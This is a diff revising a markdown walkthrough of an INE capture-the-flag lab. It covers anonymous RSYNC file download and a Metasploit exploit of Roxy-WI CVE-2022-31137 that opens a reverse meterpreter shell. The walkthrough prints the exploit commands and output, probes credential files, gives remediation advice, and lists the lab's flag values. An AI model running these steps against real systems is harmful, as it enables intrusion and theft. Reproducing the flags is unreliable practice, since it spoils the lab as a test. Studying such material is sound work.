@@ -24,26 +24,25 @@
 - [01. Lab Overview](#01-lab-overview)
 - [02. Learning Objectives and Flag Hints](#02-learning-objectives-and-flag-hints)
 - [03. Lab Environment and Prerequisites](#03-lab-environment-and-prerequisites)
-- [04. Target Identification](#04-target-identification)
-- [05. Network Discovery](#05-network-discovery)
-- [06. Port and Service Enumeration](#06-port-and-service-enumeration)
-- [07. Vulnerability Identification](#07-vulnerability-identification)
-- [08. Metasploit Workspace Setup](#08-metasploit-workspace-setup)
-- [09. Auxiliary Module Enumeration](#09-auxiliary-module-enumeration)
-- [10. Exploit Selection and Configuration](#10-exploit-selection-and-configuration)
-- [11. Exploitation Process](#11-exploitation-process)
-- [12. Session Management](#12-session-management)
-- [13. Initial Access Verification](#13-initial-access-verification)
-- [14. Privilege Enumeration and Escalation](#14-privilege-enumeration-and-escalation)
-- [15. Credential Discovery](#15-credential-discovery)
-- [16. Lateral Movement Assessment](#16-lateral-movement-assessment)
-- [17. Flag Discovery and Retrieval](#17-flag-discovery-and-retrieval)
-- [18. Consolidated Vulnerability Findings](#18-consolidated-vulnerability-findings)
-- [19. Troubleshooting and Edge Cases](#19-troubleshooting-and-edge-cases)
-- [20. Lessons Learned](#20-lessons-learned)
-- [21. Tools and Commands Reference](#21-tools-and-commands-reference)
-- [22. Evidence and Screenshot Index](#22-evidence-and-screenshot-index)
-- [23. References](#23-references)
+- [04. Target Identification and Network Discovery](#04-target-identification-and-network-discovery)
+- [05. Target 1: Port and Service Enumeration (RSYNC)](#05-target-1-port-and-service-enumeration-rsync)
+- [06. Target 1: RSYNC Banner Enumeration & Flag 1 Retrieval](#06-target-1-rsync-banner-enumeration--flag-1-retrieval)
+- [07. Target 1: RSYNC File Exploration & Flag 2 Retrieval](#07-target-1-rsync-file-exploration--flag-2-retrieval)
+- [08. Target 2: Port and Service Enumeration](#08-target-2-port-and-service-enumeration)
+- [09. Metasploit Workspace Setup & Vulnerability Identification](#09-metasploit-workspace-setup--vulnerability-identification)
+- [10. Exploit Selection and Module Configuration](#10-exploit-selection-and-module-configuration)
+- [11. Exploitation and Meterpreter Session Establishment](#11-exploitation-and-meterpreter-session-establishment)
+- [12. Session Management and Initial Access Verification](#12-session-management-and-initial-access-verification)
+- [13. Flag 3 Retrieval: Root Filesystem Inspection](#13-flag-3-retrieval-root-filesystem-inspection)
+- [14. Target 2: Scheduled Tasks Auditing & Flag 4 Retrieval](#14-target-2-scheduled-tasks-auditing--flag-4-retrieval)
+- [15. Post-Exploitation Analysis: Privileges, Credentials & Lateral Movement](#15-post-exploitation-analysis-privileges-credentials--lateral-movement)
+- [16. Results and Verified Flags Summary](#16-results-and-verified-flags-summary)
+- [17. Consolidated Vulnerability Findings](#17-consolidated-vulnerability-findings)
+- [18. Troubleshooting and Edge Cases](#18-troubleshooting-and-edge-cases)
+- [19. Lessons Learned](#19-lessons-learned)
+- [20. Tools and Commands Reference](#20-tools-and-commands-reference)
+- [21. Evidence and Screenshot Index](#21-evidence-and-screenshot-index)
+- [22. References](#22-references)
 
 ---
 
@@ -94,7 +93,7 @@ The assessment operates within an isolated virtual laboratory network provided b
 
 ---
 
-## 04. Target Identification
+## 04. Target Identification and Network Discovery
 
 Initial verification confirmed that both target hostnames resolve and respond across the local subnet:
 
@@ -103,13 +102,7 @@ ping -c 2 target1.ine.local
 ping -c 2 target2.ine.local
 ```
 
-Both hosts reside within the same local /24 broadcast domain with sub-millisecond network latency, providing an optimal environment for full TCP port sweeps without rate-limiting constraints.
-
----
-
-## 05. Network Discovery
-
-An initial host confirmation established that both machines were operational:
+Both hosts reside within the same local `/24` broadcast domain (`192.244.166.0/24`) with sub-millisecond network latency:
 - **`target1.ine.local`**: Resolved to `192.244.166.3`.
 - **`target2.ine.local`**: Resolved to `192.244.166.4`.
 
@@ -117,9 +110,9 @@ Network discovery confirmed that no firewall filtering or port blocking was pres
 
 ---
 
-## 06. Port and Service Enumeration
+## 05. Target 1: Port and Service Enumeration (RSYNC)
 
-### 1. Enumerating Target 1 (`target1.ine.local`)
+### Full TCP Port Sweep on Target 1
 
 A full TCP port scan was executed across all 65,535 ports using Nmap:
 
@@ -151,9 +144,126 @@ Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
 
 ---
 
-### 2. Enumerating Target 2 (`target2.ine.local`)
+## 06. Target 1: RSYNC Banner Enumeration & Flag 1 Retrieval
 
-A full TCP port sweep was performed against `target2.ine.local`:
+### Objective
+*"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting."*
+
+### Technical Concept: RSYNC Protocol & Banner Disclosure
+The RSYNC daemon protocol enables remote synchronization of directory trees. When an RSYNC daemon is queried with module listing commands (such as `rsync host::` or via Metasploit's `auxiliary/scanner/rsync/modules_list`), the daemon returns a list of configured module names alongside their administrative comment strings. If administrators place sensitive text or security flags within the comment parameter in `/etc/rsyncd.conf`, this metadata is publicly disclosed without authentication.
+
+### Querying RSYNC Modules & Banner
+Connecting to `target1.ine.local` using the native `rsync` client:
+
+```bash
+rsync target1.ine.local::
+```
+
+**Observed Terminal Output:**
+```text
+backupwscohen   FLAG1_7956a8a6e8084699a3b659f13b06bdb0
+```
+
+![Flag 1 RSYNC Banner](screenshots/03-target1-rsync-banner-flag1.png)
+
+**Analysis:**
+The RSYNC daemon advertises an active module named `backupwscohen`. The module description comment directly discloses the complete Flag 1 string.
+
+```text
+Flag 1 Location: target1.ine.local:: (Module description comment)
+Flag 1 Value:    FLAG1_7956a8a6e8084699a3b659f13b06bdb0
+Status:          Visually Verified
+```
+
+---
+
+## 07. Target 1: RSYNC File Exploration & Flag 2 Retrieval
+
+### Objective
+*"The files on the RSYNC server hold valuable information. Explore the contents to find the flag."*
+
+### Step 1: Listing Remote Files in `backupwscohen`
+
+Before synchronizing data, the contents of the `backupwscohen` module were inspected using `--list-only`:
+
+```bash
+rsync --list-only target1.ine.local::backupwscohen/
+```
+
+**Observed Terminal Output:**
+```text
+drwxr-xr-x          4,096 2026/11/23 18:26:56 .
+-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt
+-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd
+-rw-r--r--             39 2026/11/23 18:26:56 pii_data.xlsx
+```
+
+![Flag 2 RSYNC File Listing](screenshots/04-target1-rsync-module-listing.png)
+
+**Directory Findings:**
+The module exposes three files:
+- `TPSData.txt` (20 bytes)
+- `office_staff.vhd` (25 bytes)
+- `pii_data.xlsx` (39 bytes, simulated Personally Identifiable Information spreadsheet)
+
+### Step 2: Downloading Exposed Files
+
+A local staging directory was created, and all files were exfiltrated using `rsync -av`:
+
+```bash
+mkdir rsync_files
+rsync -av target1.ine.local::backupwscohen/ ./rsync_files/
+```
+
+**Observed Terminal Output:**
+```text
+receiving incremental file list
+./
+TPSData.txt
+office_staff.vhd
+pii_data.xlsx
+
+sent 84 bytes  received 341 bytes  850.00 bytes/sec
+total size is 84  speedup is 0.20
+```
+
+![Flag 2 Exfiltration](screenshots/05-target1-rsync-file-download.png)
+
+### Step 3: Inspecting Exfiltrated Data & Retrieving Flag 2
+
+Navigating to the download folder and reading the files:
+
+```bash
+cd rsync_files
+ls
+cat TPSData.txt
+cat pii_data.xlsx
+```
+
+**Observed Terminal Output:**
+```text
+Sample data for TPS
+FLAG2_eabf8eb725164d73992246eb77fde35b
+```
+
+![Flag 2 Extraction](screenshots/06-target1-flag2-retrieval.png)
+
+**Analysis:**
+While `TPSData.txt` contained generic sample text, `pii_data.xlsx` contained Flag 2 stored in cleartext.
+
+```text
+Flag 2 Location: backupwscohen/pii_data.xlsx
+Flag 2 Value:    FLAG2_eabf8eb725164d73992246eb77fde35b
+Status:          Visually Verified
+```
+
+---
+
+## 08. Target 2: Port and Service Enumeration
+
+### Full TCP Port Sweep on Target 2
+
+With Target 1 fully enumerated and Flags 1 and 2 retrieved, attention shifted to `target2.ine.local` (`192.244.166.4`):
 
 ```bash
 nmap -T4 -sV -sC -p- target2.ine.local
@@ -188,27 +298,10 @@ Service Info: Host: roxy-wi.example.com
 
 ---
 
-## 07. Vulnerability Identification
+## 09. Metasploit Workspace Setup & Vulnerability Identification
 
-### Target 1: Unauthenticated Anonymous RSYNC Exposure
-The RSYNC protocol (TCP port 873) is designed for efficient delta-transfer file copying. In production environments, RSYNC modules should require authentication credentials configured via `secrets file` and restrict network access via `hosts allow`.
-- **Security Flaw**: The RSYNC daemon on `target1.ine.local` is misconfigured to permit unrestricted, anonymous read access.
-- **Impact**: Any network client can enumerate available shared modules, read module descriptions (which exposed Flag 1), and exfiltrate raw backup data (which exposed Flag 2) without supplying credentials.
-
-### Target 2: Roxy-WI Unauthenticated Command Injection (CVE-2022-31137)
-Roxy-WI versions prior to `6.1.1.0` contain an unauthenticated command injection vulnerability in `/app/options.py`.
-- **Root Cause**: The application passes user-controlled parameters from HTTP requests to system shell execution functions via `subprocess_execute()` without adequate validation or shell escaping.
-- **Impact**: Remote, unauthenticated attackers can execute arbitrary operating system commands under the context of the web server account (`www-data`).
-- **Vulnerability Identifiers**:
-  - **CVE ID**: [CVE-2022-31137](https://nvd.nist.gov/vuln/detail/CVE-2022-31137)
-  - **CVSS 3.1 Base Score**: **9.8 Critical** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
-  - **Weakness Enumeration**: [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
-
----
-
-## 08. Metasploit Workspace Setup
-
-To maintain structured database tracking across the multi-host assessment, a dedicated Metasploit workspace was initialized:
+### Metasploit Workspace Management
+To organize findings and store service records across both targets, an MSF database workspace was initialized:
 
 ```bash
 msfconsole -q
@@ -224,31 +317,13 @@ msf6 > hosts
 msf6 > services
 ```
 
-Using `db_nmap` automatically ingests open ports, service banners, and host metadata into Metasploit's PostgreSQL backend, facilitating centralized querying throughout the engagement.
+### Vulnerability Analysis: Roxy-WI Remote Command Execution (CVE-2022-31137)
+Roxy-WI versions prior to `6.1.1.0` suffer from an unauthenticated OS command injection vulnerability in `/app/options.py`.
+- **Root Cause**: The application passes user-controlled parameters from HTTP requests directly to underlying shell execution functions via `subprocess_execute()` without sanitization.
+- **Impact**: Remote unauthenticated attackers can execute arbitrary shell commands under the web service account (`www-data`).
+- **Identifiers**: **CVE-2022-31137** (NVD CVSS:3.1 Base Score: **9.8 Critical**, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).
 
----
-
-## 09. Auxiliary Module Enumeration
-
-Per Objective 1 (*"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely"*), Metasploit provides dedicated scanner modules to interact with RSYNC services:
-
-```text
-msf6 > search rsync
-msf6 > use auxiliary/scanner/rsync/modules_list
-msf6 auxiliary(scanner/rsync/modules_list) > set rhosts target1.ine.local
-rhosts => target1.ine.local
-msf6 auxiliary(scanner/rsync/modules_list) > run
-```
-
-The auxiliary module queries the remote daemon for advertised modules and comment banners. This was complemented by direct native CLI interaction using `rsync`, which directly surfaced the module and Flag 1.
-
----
-
-## 10. Exploit Selection and Configuration
-
-### Searching for Roxy-WI Exploit Modules
-
-Searching the Metasploit Framework module cache for `Roxy-WI`:
+### Searching for Roxy-WI Exploit Modules in Metasploit
 
 ```text
 msf6 > search Roxy-WI
@@ -268,11 +343,15 @@ Matching Modules
 
 ![Metasploit Search Roxy-WI](screenshots/08-msf-search-roxy-wi.png)
 
-The module `exploit/linux/http/roxy_wi_exec` possesses an **Excellent** reliability ranking and contains an automated vulnerability check method (`Check: Yes`).
+The module `exploit/linux/http/roxy_wi_exec` has an **Excellent** reliability ranking and contains an automated pre-exploitation vulnerability check method (`Check: Yes`).
+
+---
+
+## 10. Exploit Selection and Module Configuration
 
 ### Selecting the Module & Reviewing Parameters
 
-Load the exploit module using its index:
+Load the exploit module:
 
 ```text
 msf6 > use 0
@@ -283,13 +362,13 @@ msf6 exploit(linux/http/roxy_wi_exec) > options
 ![Metasploit Roxy-WI Options](screenshots/09-msf-roxy-wi-options.png)
 
 **Key Parameter Configuration:**
-- `RHOSTS`: Set to `192.244.166.4` (Target 2).
-- `RPORT`: Defaults to `443` (HTTPS).
-- `SSL`: Defaults to `true` (matches the SSL-enabled web service on port 443).
-- `TARGETURI`: Defaults to `/`.
-- `LHOST`: Configured to `192.244.166.2` (Kali attacker machine IP).
-- `LPORT`: Configured to `4444`.
-- `Payload`: Automatically selected `cmd/unix/python/meterpreter/reverse_tcp`.
+- `RHOSTS`: Target IP address (`192.244.166.4`).
+- `RPORT`: Target HTTPS port (`443`, default).
+- `SSL`: SSL negotiation enabled (`true`, default).
+- `TARGETURI`: Base application URI (`/`, default).
+- `LHOST`: Attacker listening IP address (`192.244.166.2`).
+- `LPORT`: Attacker listening port (`4444`, default).
+- `Payload`: Automatically defaulted to `cmd/unix/python/meterpreter/reverse_tcp`.
 
 ```text
 msf6 exploit(linux/http/roxy_wi_exec) > set rhosts 192.244.166.4
@@ -300,9 +379,11 @@ lhost => 192.244.166.2
 
 ---
 
-## 11. Exploitation Process
+## 11. Exploitation and Meterpreter Session Establishment
 
-The exploit was executed against `target2.ine.local`:
+### Firing the Exploit
+
+With all parameters configured, the exploit was launched against `target2.ine.local`:
 
 ```text
 msf6 exploit(linux/http/roxy_wi_exec) > exploit
@@ -325,7 +406,7 @@ meterpreter >
 ![Exploit Execution and Meterpreter Session](screenshots/10-msf-roxy-wi-exploitation.png)
 
 **Exploit Execution Lifecycle:**
-1. The module initialized a reverse TCP handler on `192.244.166.2:4444`.
+1. The module initialized a local reverse TCP handler on `192.244.166.2:4444`.
 2. The automatic check routine verified that `192.244.166.4:443` was vulnerable by sending a test command injection payload and confirming a `200 OK` response with successful test output.
 3. The weaponized command injection payload was transmitted to `/app/options.py`.
 4. The target executed the injected command, which initiated a reverse connection back to the handler.
@@ -333,16 +414,11 @@ meterpreter >
 
 ---
 
-## 12. Session Management
+## 12. Session Management and Initial Access Verification
+
+### Spawning an Interactive Shell from Meterpreter
 
 Meterpreter provides post-exploitation interaction capabilities directly within the target process environment:
-
-```text
-meterpreter > sysinfo
-meterpreter > getuid
-```
-
-To interact directly with the underlying Linux operating system, Meterpreter allows traversing directories and spawning a sub-shell:
 
 ```text
 meterpreter > cd ..
@@ -350,165 +426,66 @@ meterpreter > cd /
 meterpreter > shell
 ```
 
-**Observed Output:**
+**Observed Terminal Output:**
 ```text
 Process 365 created.
 Channel 1 created.
 /bin/bash -i
 bash: cannot set terminal process group (362): Inappropriate ioctl for device
 bash: no job control in this shell
-www-data@target2:/$
+www-data@target2:/$ cd ..
+cd ..
+www-data@target2:/$ ls
+ls
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+www-data@target2:/$ cat flag.txt
 ```
 
 ![Meterpreter Shell Spawning](screenshots/11-meterpreter-shell-target2.png)
 
-The `shell` command created Process `365` and Channel `1`, providing an interactive `/bin/bash` shell session.
-
----
-
-## 13. Initial Access Verification
-
-Upon dropping into the interactive shell, initial identity and environment verification was performed:
-
-- **User Context**: `www-data` (the standard low-privileged service account assigned to the Apache web server).
+**Initial Access Verification:**
+- **User Identity**: `www-data` (the standard low-privileged service account assigned to the Apache web server).
 - **Working Directory**: `/` (root directory).
-- **Operating Environment**: Ubuntu Linux on host `target2`.
-- **Job Control Notice**: `bash: no job control in this shell` is standard behavior when interacting through a pseudo-terminal pipe without a full TTY allocation.
+- **Filesystem Verification**: Running `ls` immediately revealed the presence of `flag.txt` alongside standard Linux root directories (`bin`, `boot`, `dev`, `etc`, `home`, `root`, `var`).
 
 ---
 
-## 14. Privilege Enumeration and Escalation
+## 13. Flag 3 Retrieval: Root Filesystem Inspection
 
-With access established as `www-data`, system privilege posture was analyzed:
+### Objective
+*"Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local."*
 
-1. **Sudo Privileges**:
-   ```bash
-   sudo -l
-   ```
-2. **Access Control Verification**:
-   When grepping system files under `/etc`, permissions were strictly enforced on sensitive security files:
-   - `/etc/shadow`: Permission denied.
-   - `/etc/sudoers`: Permission denied.
-   - `/etc/security/opasswd`: Permission denied.
-   - `/etc/ssl/private`: Permission denied.
-
-> [!NOTE] Privilege Escalation Context
-> Both Flag 3 and Flag 4 were retrievable directly from the `www-data` context:
-> - Flag 3 was located in `/flag.txt` with world-readable read permissions (`-rw-r--r--`).
-> - Flag 4 was located in `/etc/cron.d/www-data-cron`, a cron definition specifically assigned to and readable by `www-data`.
-> Full root escalation was therefore not required to complete the lab objectives.
-
----
-
-## 15. Credential Discovery
-
-During the assessment of Target 1, anonymous access to the `backupwscohen` module allowed downloading three files:
-- `TPSData.txt` (Text file containing sample operational data).
-- `office_staff.vhd` (Virtual Hard Disk image file).
-- `pii_data.xlsx` (Spreadsheet file).
-
-Examining `pii_data.xlsx` revealed Flag 2 directly stored in plaintext within the simulated personal data file.
-
----
-
-## 16. Lateral Movement Assessment
-
-The lab network architecture separates Target 1 (storage/backup) and Target 2 (application gateway) on the same subnet (`192.244.166.0/24`):
-- Rather than pivoting through Target 1, Target 2 was directly routable and accessible from the attacker machine on ports 80 and 443.
-- In a full enterprise red team engagement, files recovered from Target 1 (such as `office_staff.vhd` or configuration backups) would typically be mounted and mined for administrative passwords, SSH keys, or API tokens to authenticate against management interfaces like Roxy-WI. Here, Roxy-WI's unauthenticated command injection vulnerability rendered credential hunting unnecessary for initial access.
-
----
-
-## 17. Flag Discovery and Retrieval
-
-### Flag 1: Target 1 RSYNC Banner Enumeration
-
-**Objective**: *"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting."*
-
-Connecting to `target1.ine.local` using the native `rsync` client:
+### Reading Flag 3
+Executing `cat flag.txt` from the root directory:
 
 ```bash
-rsync target1.ine.local::
-```
-
-**Observed Terminal Output:**
-```text
-backupwscohen   FLAG1_7956a8a6e8084699a3b659f13b06bdb0
-```
-
-![Flag 1 RSYNC Banner](screenshots/03-target1-rsync-banner-flag1.png)
-
-```text
-Flag 1 Location: target1.ine.local:: (Module description comment)
-Flag 1 Value:    FLAG1_7956a8a6e8084699a3b659f13b06bdb0
-Status:          Visually Verified
-```
-
----
-
-### Flag 2: Target 1 Sensitive Files on the RSYNC Server
-
-**Objective**: *"The files on the RSYNC server hold valuable information. Explore the contents to find the flag."*
-
-#### Step 1: Listing Remote Files in `backupwscohen`
-```bash
-rsync --list-only target1.ine.local::backupwscohen/
-```
-
-**Observed Terminal Output:**
-```text
-drwxr-xr-x          4,096 2026/11/23 18:26:56 .
--rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt
--rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd
--rw-r--r--             39 2026/11/23 18:26:56 pii_data.xlsx
-```
-
-![Flag 2 RSYNC File Listing](screenshots/04-target1-rsync-module-listing.png)
-
-#### Step 2: Downloading and Inspecting Files
-```bash
-mkdir rsync_files
-rsync -av target1.ine.local::backupwscohen/ ./rsync_files/
-cd rsync_files
-ls
-cat TPSData.txt
-cat pii_data.xlsx
-```
-
-**Observed Terminal Output:**
-```text
-Sample data for TPS
-FLAG2_eabf8eb725164d73992246eb77fde35b
-```
-
-![Flag 2 Exfiltration](screenshots/05-target1-rsync-file-download.png)
-![Flag 2 Extraction](screenshots/06-target1-flag2-retrieval.png)
-
-```text
-Flag 2 Location: backupwscohen/pii_data.xlsx
-Flag 2 Value:    FLAG2_eabf8eb725164d73992246eb77fde35b
-Status:          Visually Verified
-```
-
----
-
-### Flag 3: Target 2 Web Application Shell Exploitation
-
-**Objective**: *"Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local."*
-
-#### Step: Navigating to Root Directory and Reading `/flag.txt`
-Inside the interactive shell spawned from Meterpreter Session 1:
-
-```bash
-cd ..
-ls
 cat flag.txt
 ```
 
 **Observed Terminal Output:**
 ```text
-bin  boot  dev  etc  flag.txt  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
-FLAG3_aa0038d5756743bfa80796ebea45bdd2
+www-data@target2:/$ FLAG3_aa0038d5756743bfa80796ebea45bdd2
 ```
 
 ![Flag 3 Reading](screenshots/12-target2-flag3-retrieval.png)
@@ -521,11 +498,23 @@ Status:          Visually Verified
 
 ---
 
-### Flag 4: Target 2 Scheduled Tasks / Cron Job Investigation
+## 14. Target 2: Scheduled Tasks Auditing & Flag 4 Retrieval
 
-**Objective**: *"Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag."*
+### Objective
+*"Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag."*
 
-#### Step: Recursive Search for Flags in `/etc`
+### Technical Concept: Auditing Automated Tasks & Crontabs
+In Linux systems, automated tasks are managed by the `cron` daemon. Scheduled job definitions are placed across multiple standard locations:
+- System crontab: `/etc/crontab`
+- Directory-based cron tables: `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`
+- User spool files: `/var/spool/cron/crontabs/`
+
+Automated scripts frequently embed configuration parameters, backup scripts, and sensitive tokens. System administrators or automated provisioning routines occasionally expose credentials or sensitive data in world-readable cron entries.
+
+### Recursive Search Across `/etc`
+
+Traversing into `/etc` and executing a recursive, case-insensitive search for "flag":
+
 ```bash
 cd etc
 grep -ri "flag" /etc
@@ -543,13 +532,20 @@ grep: /etc/mysql/debian.cnf: Permission denied
 grep: /etc/shadow-: Permission denied
 grep: /etc/ssl/private: Permission denied
 grep: /etc/gshadow-: Permission denied
+www-data@target2:/etc$ /etc/pam.conf:# name    type    flag
+/etc/default/useradd:# This argument is used when the -n flag is specified.
+/etc/netconfig:#    <network_id> <semantics> <flags> <protofamily> <protoname> \
+/etc/security/namespace.init:# a flag whether the instance dir was newly created (0 - no, 1 - yes) in $3,
 /etc/cron.d/www-data-cron:* * * * * www-data echo "FLAG4_d489d5d9736b4975bb8e644eb6335e4c"
+/etc/sudo_logsrvd.conf:# flag.  If no port is specified, port 30343 will be used for plaintext
+/etc/matplotlibrc:## FreeType hinting flag ("foo" corresponds to FT_LOAD_FOO); may be one of the
+/etc/fonts/conf.avail/90-synthetic.conf:        set the embolden flag
 ```
 
 ![Flag 4 Cron Discovery](screenshots/13-target2-flag4-cron-discovery.png)
 
 **Analysis:**
-The recursive search surfaced a scheduled cron task located at `/etc/cron.d/www-data-cron`. The cron entry is configured to run every minute (`* * * * *`) under user `www-data` executing an `echo` statement outputting the flag string.
+The recursive search surfaced a scheduled cron task located at `/etc/cron.d/www-data-cron`. The cron entry is configured to run every minute (`* * * * *`) under user `www-data`, executing an `echo` statement that outputs the Flag 4 string.
 
 ```text
 Flag 4 Location: /etc/cron.d/www-data-cron
@@ -559,12 +555,42 @@ Status:          Visually Verified
 
 ---
 
-## 18. Consolidated Vulnerability Findings
+## 15. Post-Exploitation Analysis: Privileges, Credentials & Lateral Movement
+
+### 1. Privilege Posture
+- Initial access was achieved directly as service account `www-data`.
+- Permissions on sensitive system files (`/etc/shadow`, `/etc/sudoers`, `/etc/ssl/private`) were strictly enforced, returning `Permission denied`.
+- Because Flag 3 (`/flag.txt`) was world-readable and Flag 4 (`/etc/cron.d/www-data-cron`) was readable by `www-data`, complete challenge completion did not require kernel exploitation or local root escalation.
+
+### 2. Credential Discovery
+- On Target 1, anonymous RSYNC access allowed exfiltrating `pii_data.xlsx`, `office_staff.vhd`, and `TPSData.txt`.
+- On Target 2, hardcoded operational strings were discovered within cron job configuration definitions.
+
+### 3. Lateral Movement Context
+- Both targets reside within the same local subnet (`192.244.166.0/24`).
+- Target 2 was directly routable and exposed on ports 80 and 443, enabling direct exploitation without requiring an intermediate proxy or pivoting tunnel through Target 1.
+
+---
+
+## 16. Results and Verified Flags Summary
+
+All four challenge objectives were completed successfully across both target machines:
+
+| Objective | Target Host | Operating Context | File / Asset Path | Verified Flag String | Validation Status |
+| :---: | :---: | :--- | :--- | :--- | :---: |
+| **Flag 1** | `target1.ine.local` (`192.244.166.3`) | Anonymous RSYNC Query | `target1.ine.local::backupwscohen` (Banner) | `FLAG1_7956a8a6e8084699a3b659f13b06bdb0` | Visually Verified |
+| **Flag 2** | `target1.ine.local` (`192.244.166.3`) | Anonymous RSYNC Download | `backupwscohen/pii_data.xlsx` | `FLAG2_eabf8eb725164d73992246eb77fde35b` | Visually Verified |
+| **Flag 3** | `target2.ine.local` (`192.244.166.4`) | `www-data` Interactive Shell | `/flag.txt` | `FLAG3_aa0038d5756743bfa80796ebea45bdd2` | Visually Verified |
+| **Flag 4** | `target2.ine.local` (`192.244.166.4`) | `www-data` Interactive Shell | `/etc/cron.d/www-data-cron` | `FLAG4_d489d5d9736b4975bb8e644eb6335e4c` | Visually Verified |
+
+---
+
+## 17. Consolidated Vulnerability Findings
 
 ### 1. Unauthenticated Remote Command Execution in Roxy-WI (CVE-2022-31137)
 - **Affected System**: `target2.ine.local` (`192.244.166.4:443`)
 - **Severity**: **Critical** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Base Score: **9.8**)
-- **Vulnerability Description**: Roxy-WI instances prior to version `6.1.1.0` execute external system commands through `options.py` without proper input neutralization. Because this endpoint requires no prior authentication, remote unauthenticated attackers can inject arbitrary shell commands, gaining an interactive command shell as `www-data`.
+- **Vulnerability Description**: Roxy-WI instances prior to version `6.1.1.0` execute external system commands through `/app/options.py` without proper input neutralization. Because this endpoint requires no prior authentication, remote unauthenticated attackers can inject arbitrary shell commands, gaining an interactive command shell as `www-data`.
 - **CWE**: [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
 - **Remediation**:
   - Upgrade Roxy-WI immediately to version `6.1.1.0` or later.
@@ -592,7 +618,7 @@ Status:          Visually Verified
 
 ---
 
-## 19. Troubleshooting and Edge Cases
+## 18. Troubleshooting and Edge Cases
 
 1. **RSYNC Syntax Variations**:
    - Querying daemon modules requires double-colon syntax (`rsync host::`), whereas SSH-encapsulated rsync uses a single colon (`rsync user@host:/path`).
@@ -607,7 +633,7 @@ Status:          Visually Verified
 
 ---
 
-## 20. Lessons Learned
+## 19. Lessons Learned
 
 1. **Protocol Specific Reconnaissance**: Non-standard protocols such as RSYNC (873), NFS (2049), and SMB (445) frequently expose substantial data without requiring exploitation when misconfigured for anonymous access.
 2. **Administrative Appliances as Attack Vectors**: Web-based administration tools (Roxy-WI, Webmin, Cockpit) represent high-value targets. Because they inherently manage core system services, vulnerabilities in these appliances frequently lead directly to root or critical service context execution.
@@ -615,7 +641,7 @@ Status:          Visually Verified
 
 ---
 
-## 21. Tools and Commands Reference
+## 20. Tools and Commands Reference
 
 | Phase | Tool | Command Line | Operational Purpose |
 | :--- | :--- | :--- | :--- |
@@ -635,9 +661,9 @@ Status:          Visually Verified
 
 ---
 
-## 22. Evidence and Screenshot Index
+## 21. Evidence and Screenshot Index
 
-All thirteen primary evidence screenshots have been organized and verified sequentially:
+All thirteen primary evidence screenshots appear sequentially throughout the walkthrough:
 
 | # | Filename | Status | Description & Key Evidence |
 | :---: | :--- | :---: | :--- |
@@ -657,7 +683,7 @@ All thirteen primary evidence screenshots have been organized and verified seque
 
 ---
 
-## 23. References
+## 22. References
 
 - [CVE-2022-31137: Roxy-WI Remote Code Execution Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-31137)
 - [Rapid7 Metasploit Exploit Module: roxy_wi_exec](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/roxy_wi_exec.rb)
